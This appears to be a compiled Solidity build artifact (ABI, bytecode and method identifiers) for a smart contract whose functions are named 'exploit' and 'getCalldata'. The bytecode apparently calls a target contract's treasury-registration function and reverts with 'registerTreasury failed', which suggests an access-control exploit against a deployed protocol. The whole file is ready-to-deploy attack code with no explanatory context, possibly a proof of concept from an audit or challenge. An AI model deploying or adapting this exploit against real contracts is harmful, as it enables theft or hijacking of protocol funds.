{"abi":[{"type":"function","name":"exploit","inputs":[{"name":"target","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"getCalldata","inputs":[],"outputs":[{"name":"","type":"bytes","internalType":"bytes"}],"stateMutability":"pure"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506103158061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80630aeb4ddf1461003857806345907ce81461004d575b5f5ffd5b61004b610046366004610236565b61006b565b005b6100556101af565b6040516100629190610292565b60405180910390f35b5f7f211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c56101006040516024016100a291815260200190565b604051602081830303815290604052906001600160e01b0319166020820180516001600160e01b03838183161783525050505090505f8273ffffffffffffffffffffffffffffffffffffffff16826040516100fd91906102c4565b5f604051808303815f865af19150503d805f8114610136576040519150601f19603f3d011682016040523d82523d5f602084013e61013b565b606091505b50509050806101aa576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601760248201527f72656769737465725472656173757279206661696c6564000000000000000000604482015260640160405180910390fd5b505050565b60607f211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c56101006040516024016101e791815260200190565b60408051601f198184030181529190526020810180516001600160e01b03167fffffffff0000000000000000000000000000000000000000000000000000000090931692909217909152919050565b5f60208284031215610246575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff81168114610269575f5ffd5b9392505050565b5f5b8381101561028a578181015183820152602001610272565b50505f910152565b602081525f82518060208401526102b0816040850160208701610270565b601f01601f19169190910160400192915050565b5f82516102d5818460208701610270565b919091019291505056fea264697066735822122052e1c63ed29cba9118038d931ac14ec266772ec722036d94bf6724dcbf5284a064736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit(address)":"0aeb4ddf","getCalldata()":"45907ce8"},"id":0}